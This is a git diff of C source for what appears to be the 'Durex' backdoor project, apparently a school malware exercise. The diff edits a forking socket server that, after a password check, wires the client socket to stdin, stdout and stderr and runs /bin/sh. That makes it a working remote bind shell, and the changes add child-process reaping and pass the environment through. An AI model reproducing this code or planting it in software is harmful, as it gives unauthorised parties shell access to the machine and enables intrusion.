@@ -1,6 +1,12 @@
 #include <durex.h>
 
-void	connection(int sock)
+void	handle_sigchld(int p)
+{
+	(void)p;
+	wait4(-1, NULL, WNOHANG, NULL);
+}
+
+void	connection(int sock, char **env)
 {
 	char	*str;
 	char	*hash;
@@ -38,17 +44,19 @@ void	connection(int sock)
 		}
 		free(str);
 	}
+	dup2(sock, 2);
 	dup2(sock, 1);
 	dup2(sock, 0);
-	execv("/bin/bash", NULL);
+	execve("/bin/sh", (char *[]){"/bin/sh", NULL}, env);
 }
 
-void	handle_connection(int sock)
+void	handle_connection(int sock, char **env)
 {
 	int					cs;
 	struct sockaddr_in	csin;
 	socklen_t			addrlen;
 
+	signal(SIGCHLD, handle_sigchld);
 	while (42)
 	{
 		addrlen = sizeof(struct sockaddr_in);
@@ -62,7 +70,7 @@ void	handle_connection(int sock)
 		{
 			if (fork() == 0)
 			{
-				connection(cs);
+				connection(cs, env);
 				exit(1);
 			}
 			else
@@ -90,6 +98,7 @@ int		create_server()
 	if (bind(sock, (struct sockaddr *)&sin, sizeof(sin)) == -1)
 	{
 		ft_putendl_fd("Error: Bind failure", 2);
+		perror("");
 		return (0);
 	}
 	if (listen(sock, 3) == -1)
